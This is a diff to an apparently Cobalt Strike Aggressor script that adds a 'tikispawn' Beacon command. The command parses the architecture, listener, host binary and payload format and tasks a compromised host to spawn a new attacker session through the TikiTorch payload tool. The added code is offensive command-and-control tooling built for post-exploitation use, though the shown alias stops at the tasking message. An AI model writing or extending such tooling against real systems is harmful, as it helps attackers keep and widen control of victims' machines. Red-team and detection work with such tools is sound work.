@@ -1,6 +1,6 @@
 sub launch_tikitorch {
 	
-	local('%options $script $uri $payload');
+	local('%options $uri $payload');
 	%options = $3;
 
 	$uri = $3["uri"];
@@ -121,5 +121,46 @@ popup attacks {
 		dbutton_action($dialog, "Go");
 		dialog_show($dialog);
 	}
+
+}
+
+beacon_command_register(
+	"tikispawn", 
+	"Spawn a session via TikiTorch", 
+	"Use: tikispawn [x86|x64] [listener] [binary] [format]\n" .
+    "tikispawn [listener]\n\n" .
+	"Spawn a new session as the curren user via a TikiTorch payload."
+);
+
+alias tikispawn {
+	local('$input');
+	$input = substr($0, 10);
+	@args = split(' ', $input);
+
+	if (size(@args) eq "1") {
+
+		if ( -is64 $1 ) { $arch = "x64" }
+		else { $arch = "x86" }
+
+		$listener = @args[0];
+
+		$process = "C:\\Windows\\System32\\calc.exe";
+		$format = "xsl";
+
+	} else if (size(@args) eq "4") {
+
+		$arch = @args[0];
+		$listener = @args[1];
+		$process = @args[2];
+		$format = @args[3];
+
+	} else {
+
+		berror($1, "Invalid number of arguments");
+		return;
+
+	}
+
+	btask($1, "Tasked Beacon to run " . listener_describe($listener) . " via TikiTorch " . $format);
 
 }
